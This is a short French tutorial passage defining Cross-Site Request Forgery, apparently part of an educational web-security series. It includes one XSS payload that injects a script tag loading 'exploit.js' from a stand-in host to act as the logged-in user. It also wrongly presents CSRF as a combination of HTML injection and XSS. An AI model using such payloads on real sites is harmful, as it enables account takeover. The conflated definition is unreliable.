# 3. Cross-Site Request Forgery (CSRF)

Le CSRF est une attaque qui combine l'injection HTML et le XSS pour faire des appels vers des API où l'utilisateur est authentifié.

Ainsi, le pirate peut effectuer des actions en se passant pour l'utilisateur.

## Exemple

Si on continue avec l'exemple du [`2. XSS`](./2-xss.md), on pourrait importer directement
un script `exploit.js` comme ceci: `"><script src=//www.example.com/exploit.js></script>`.

Ce script pourrait contenir les instructions qui permettent de changer le mot de passe de l'utilisateur connecté par exemple.
